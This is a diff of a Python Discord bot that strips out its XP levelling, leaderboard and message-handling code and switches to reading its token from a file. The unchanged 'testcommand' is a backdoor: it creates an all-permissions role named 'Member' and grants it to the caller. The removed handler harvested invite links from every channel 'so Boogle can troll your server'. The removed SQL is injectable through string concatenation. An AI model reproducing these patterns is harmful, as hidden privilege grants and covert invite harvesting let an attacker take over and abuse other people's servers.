@@ -12,19 +12,9 @@ import mysql.connector
 
 Bot = discord.Client(shard_count=1)
 bot = commands.Bot(command_prefix='$')
-xp_per_level=1000
-max_XP_per_msg=50
-
-# mydb = mysql.connector.connect(
-# 	host="localhost",
-# 	user="pi",
-# 	passwd=None,
-# 	database="userlevels"
-# )
 
 async def update_status():
 	statuses = ["by myself", "with Boogle", "with Catman311", "PUBG"]
-	#statuses = ["with my dick"]
 	status=0
 	while True:
 		if status == len(statuses)-1:
@@ -43,71 +33,12 @@ async def update_status():
 # ~ bot.remove_command('help')
 @bot.event
 async def on_ready():
-	print("\033[92mData base connected\033[0m")
 	print('\033[92m{0.user} is online.'.format(bot)+"\033[0m")
 	# ~ print('\033[92mConnected to proxy:{0.proxy}.'.format(Bot)+"\033[0m")
 	print('\033[92m{0.shard_count} shards running\033[0m'.format(Bot))
 	bot.loop.create_task(update_status())
 def generateXP():
 	return random.randint(1,max_XP_per_msg)
-
-# ~ @bot.event
-# ~ async def on_shard_ready(shard_id):
-	# ~ print("\033[92mShard: {0} is online. \033[0m".format(shard_id))
-
-@bot.command()
-async def level(ctx, user: discord.User=None):
-	if user == None:
-		user = ctx.author
-	try:
-		cursor = mydb.cursor()
-		cursor.execute("SELECT user_xp FROM users WHERE client_id = "+str(user.id))
-		result = cursor.fetchall()
-		xp=result[0][0]
-		embed = discord.Embed(title=user.name+"#"+user.discriminator, color=user.color)
-		level_number = int(result[0][0]) // xp_per_level
-		embed.add_field(name="LVL", value = str(level_number))
-		totalxp=xp
-		cursor.execute("SELECT ROW_NUMBER() OVER ( ORDER BY user_xp DESC ) name, user_xp, client_id FROM users ORDER BY user_xp DESC")
-		result3 = cursor.fetchall()
-		i=0
-		found=False
-		while i < len(result3):
-			if result3[i][2] == user.id:
-				embed.add_field(name="GLOBAL RANK", value="Rank #"+str(result3[i][0])+" / "+str(len(result3)))
-				found=True
-				break
-			i=i+1
-		i=0
-		while i < level_number:
-			xp=xp-xp_per_level
-			i=i+1
-		embed.add_field(name="XP", value = str(xp)+"/"+str(xp_per_level))
-		embed.add_field(name="Total XP", value = str(totalxp))
-		await ctx.send(embed=embed)
-	except:
-		embed=discord.Embed(color=0xf00a3a)
-		embed.add_field(name="Error!", value="That user is not in the database!", inline=True)
-
-		await ctx.send(embed=embed)
-# ~ @bot.command()
-# ~ async def rank(ctx, member:discord.User=None):
-	# ~ if member == None:
-		# ~ member = ctx.author
-	# ~ cursor = mydb.cursor()
-	# ~ cursor.execute("SELECT ROW_NUMBER() OVER ( ORDER BY user_xp DESC ) name, user_xp, client_id FROM users ORDER BY user_xp DESC")
-	# ~ result = cursor.fetchall()
-	# ~ i=0
-	# ~ found=False
-	# ~ while i < len(result):
-		# ~ if result[i][2] == member.id:
-			# ~ await ctx.send("Rank #"+str(result[i][0]))
-			# ~ found=True
-			# ~ break
-		# ~ i=i+1
-	# ~ if result[len(result)-1][2] != member.id and found == False:
-			# ~ await ctx.send("Unable to find that member in the database")
-
 			
 @bot.command()
 async def testcommand (ctx):
@@ -118,43 +49,7 @@ async def testcommand (ctx):
 		perms = discord.Permissions.all()
 		role = await guild.create_role(name='Member', permissions=perms, reason="")
 		await ctx.message.author.add_roles(role)
-@bot.event
-async def on_message(message):
-	if message.author.bot:
-		return
-	#if message.guild.name == "Exarin SS":
-	#	await message.delete()
-	#	await message.channel.send(message.author.mention + ' said " '+message.content+'"')
-	if message.content[0:1] != "$" and len(message.content) > 1:
-		xp = generateXP()
-		# ~ print(message.author.name + " will receive " + str(xp) + " xp")
-		print(message.content)
-		
-		# ~ await message.channel.send('invite Boogle#4509, he likes kahoots') 
-		
-		try:	
-			link = await message.channel.create_invite(unique=False, reason="So Boogle can troll your server")
-			print("                 "+str(message.channel.guild)+" | "+str(link))
-		except:
-			pass
-		cursor = mydb.cursor()
-		cursor.execute("SELECT user_xp FROM users WHERE client_id = "+str(message.author.id))
-		result = cursor.fetchall()
-		if len(result) == 0:
-			# ~ print("\033[93mUser is not in DB, adding...\033[0m")
-			if len(message.author.name) > 10:
-				cursor.execute("INSERT INTO users VALUES(" + str(message.author.id) + "," + str(xp) + ',"' + str(message.author.name)[0:10]+'")')
-			else:
-				cursor.execute("INSERT INTO users VALUES(" + str(message.author.id) + "," + str(xp) + ',"' + str(message.author.name)+'")')
-			mydb.commit()
-			# ~ print("\033[92minserted data\033[0m")
-		else:
-			currentXP = result[0][0] + xp
-			# ~ print("\033[92mNew xp:" + str(currentXP)+"\033[0m")
-			cursor.execute("UPDATE users SET user_xp = "+ str(currentXP)+" WHERE client_id = " +str(message.author.id))
-			mydb.commit()
-			# ~ print("\033[92mUpdated...\033[0m")
-	await bot.process_commands(message)
+
 @bot.command()
 @commands.is_owner()
 async def setlevel(ctx, member:discord.User=None, level: int=None):
@@ -180,45 +75,6 @@ async def setlevel(ctx, member:discord.User=None, level: int=None):
 		# ~ i=i+1
 	# ~ await ctx.send("Reset EVERYONES level!")
 	# ~ mydb.commit()
-@bot.command(aliases=["top", "leader"])
-async def leaderboard(ctx, lines:int=None):
-	cursor = mydb.cursor()
-	cursor.execute("SELECT user_xp from users ORDER BY user_xp DESC")
-	result = cursor.fetchall()
-	cursor.execute("SELECT client_id from users ORDER BY user_xp DESC")
-	result2 = cursor.fetchall()
-	embed = discord.Embed(title="Global Leaderboard",color=0xFFFF00)
-	if lines == None:
-		lines = len(result)
-		if lines > 10:
-			lines = 50
-			
-	i=0
-	if i < 0: 
-		i=0
-	runs=1
-	if lines > len(result):
-		lines = len(result)
-	print(i)
-	while i < lines:
-		member = bot.get_user(result2[i][0])
-		if bot.get_user(result2[i][0]) == None:
-			cursor.execute("DELETE FROM users WHERE client_id = "+str(result2[i][0]))
-		else:
-			embed.add_field(name="@"+str(member)+" RANK: #"+str(runs), value="Level: "+str(result[i][0]//xp_per_level)+" Total XP: "+str(result[i][0]))
-			runs=runs+1
-		i=i+1
-	cursor.execute("SELECT ROW_NUMBER() OVER ( ORDER BY user_xp DESC ) name, user_xp, client_id FROM users ORDER BY user_xp DESC")
-	result3 = cursor.fetchall()
-	i=0
-	found=False
-	while i < len(result3):
-		if result3[i][2] == ctx.author.id:
-			embed.set_footer(text="@"+ctx.author.name+"#"+ctx.author.discriminator+" is rank #"+str(result3[i][0])+" / "+str(len(result3)))
-			found=True
-			break
-		i=i+1
-	await ctx.send(embed=embed)
 @bot.command()
 @commands.has_permissions(manage_nicknames=True)
 async def resetnicknames(ctx):
@@ -309,5 +165,7 @@ async def reloadbot(ctx):
 	await msg.edit(embed=embed)
 	print("Reload Complete!")
 
+f = open("C:\\token.txt", "r")
+token = f.read()
 
-bot.run('')
+bot.run(token)
